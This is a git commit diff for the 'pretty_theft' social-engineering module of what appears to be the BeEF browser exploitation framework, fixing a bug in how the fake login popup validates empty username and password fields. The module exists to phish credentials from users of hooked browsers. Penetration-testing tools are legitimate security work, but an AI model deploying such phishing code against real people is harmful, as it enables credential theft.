a92d4d910c559a79ea12cb18fb864cadabfff464
Jack Walker <jwrc@protonmail.com>
2020-07-06 12:44:19 +1000

    Fixed getElementById method being called on incorrect object causing looping failure.

--- modules/social_engineering/pretty_theft/command.js
+++ modules/social_engineering/pretty_theft/command.js
@@ -93,9 +93,9 @@ beef.execute(function() {
 			$j('#popup').remove();
 			$j('#darkenScreenObject').remove();
 
-		}else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true"){
+		} else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true") {
 			// If user has not entered any data, reset button
-			document.body.lastChild.getElementById("buttonpress").value = "false";
+			document.getElementById("buttonpress").value = "false";
 			alert("Please enter a valid username and password.");		
 		}
 	}
